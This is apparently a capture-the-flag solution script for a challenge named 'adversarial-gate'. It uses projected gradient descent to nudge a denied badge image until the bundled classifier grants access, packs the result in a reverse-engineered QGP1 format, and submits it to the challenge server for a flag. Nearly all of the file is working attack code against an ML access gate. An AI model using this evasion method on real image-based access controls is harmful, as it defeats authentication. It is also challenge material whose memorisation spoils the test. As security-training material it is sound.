#!/usr/bin/env python3
"""
Working solver for adversarial-gate.

White-box, integer-projected PGD toward the GRANTED class, using the exact
NumPy model shipped in the handout (so what solves locally solves on the
server -- no framework mismatch). The crafted badge is wrapped in the QGP1
container (encoder below, reconstructed from the sample corpus) and POSTed to
/submit; the server checks the epsilon bound and the classification and returns
the per-team flag.

Usage:
    python3 solve.py                      # attack a local instance
    python3 solve.py http://HOST:8080     # attack a given instance

Handout files (gatemodel.py, weights.npz, denied_badge.npy) are looked up next
to this script / in ../handout / ../app, and otherwise fetched from the
instance's /assets/.
"""
import base64
import os
import sys
import urllib.request

import numpy as np

HERE = os.path.dirname(os.path.abspath(__file__))
for p in (os.path.join(HERE, "..", "handout"), os.path.join(HERE, "..", "app"), HERE):
    sys.path.insert(0, p)

EPS = 8
SIDE = 32


# --- QGP1 encoder, reconstructed from the sample corpus --------------------
# Quirks inferred from samples/*.gatepkt vs their .npy:
#   * rows are stored BOTTOM-TO-TOP  (flags bit0 = 1)
#   * hdr_sum is a checksum over the HEADER (bytes [0:8]) ONLY
#   * rec_count counts RECORDS (== nrows), not bytes
def qgp1_encode(img):
    rows = [[int(v) & 0xFF for v in r] for r in np.asarray(img)]
    nrows, ncols = len(rows), len(rows[0])
    header = bytearray(12)
    header[0:4] = b"QGP\x01"
    header[4] = nrows
    header[5] = ncols
    header[6] = 0x01                 # bottom-to-top
    header[7] = 0
    hdr_sum = sum(header[0:8]) & 0xFFFF
    header[8] = hdr_sum & 0xFF
    header[9] = (hdr_sum >> 8) & 0xFF
    header[10] = nrows & 0xFF
    header[11] = (nrows >> 8) & 0xFF
    body = bytearray()
    for r in rows[::-1]:             # store bottom row first
        body.append(ncols)
        body.extend(r)
    return bytes(header) + bytes(body)


def _find(*names):
    for n in names:
        for base in (os.path.join(HERE, ".."), HERE):
            cand = os.path.join(base, n)
            if os.path.exists(cand):
                return cand
    return None


def _fetch(url, dst):
    with urllib.request.urlopen(url, timeout=30) as r:
        data = r.read()
    with open(dst, "wb") as f:
        f.write(data)
    return dst


def pgd(model, denied, target, eps=EPS, steps=200, step=1.0):
    x0 = denied.astype(np.float64)
    x = x0.copy()
    best, best_margin = None, -1e9
    for _ in range(steps):
        xi = np.clip(np.round(x), 0, 255).astype(np.uint8)      # integer projection
        logits, g = model.logits_and_input_grad(xi, target)
        margin = logits[target] - np.max(np.delete(logits, target))
        if int(np.argmax(logits)) == target and margin > best_margin:
            best, best_margin = xi.copy(), margin
        x = x + step * np.sign(g)               # ascend the GRANTED logit
        x = np.clip(x, x0 - eps, x0 + eps)       # project into the L-inf ball
        x = np.clip(x, 0, 255)
    return best, best_margin


def main():
    base = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080").rstrip("/")

    wpath = _find("app/weights.npz", "handout/weights.npz", "weights.npz")
    dpath = _find("app/denied_badge.npy", "handout/denied_badge.npy", "denied_badge.npy")
    mpath = _find("app/gatemodel.py", "handout/gatemodel.py", "gatemodel.py")
    if not wpath:
        wpath = _fetch(f"{base}/assets/weights.npz", os.path.join(HERE, "weights.npz"))
    if not dpath:
        dpath = _fetch(f"{base}/assets/denied_badge.npy", os.path.join(HERE, "denied_badge.npy"))
    if not mpath:
        _fetch(f"{base}/assets/gatemodel.py", os.path.join(HERE, "gatemodel.py"))

    from gatemodel import GateModel, CLASSES, GRANTED
    model = GateModel(wpath)
    denied = np.load(dpath)
    print(f"[*] denied badge classified as {CLASSES[model.predict(denied)]}")

    adv, margin = pgd(model, denied, GRANTED)
    if adv is None:
        sys.exit("[-] PGD did not reach GRANTED")
    linf = int(np.max(np.abs(adv.astype(int) - denied.astype(int))))
    print(f"[+] adversarial badge: class={CLASSES[model.predict(adv)]} "
          f"margin={margin:.2f} Linf={linf} (<= {EPS})")

    b64 = base64.b64encode(qgp1_encode(adv)).decode()
    req = urllib.request.Request(
        f"{base}/submit",
        data=('{"badge": "%s"}' % b64).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=60) as r:
        print("[*] server:", r.read().decode())


if __name__ == "__main__":
    main()
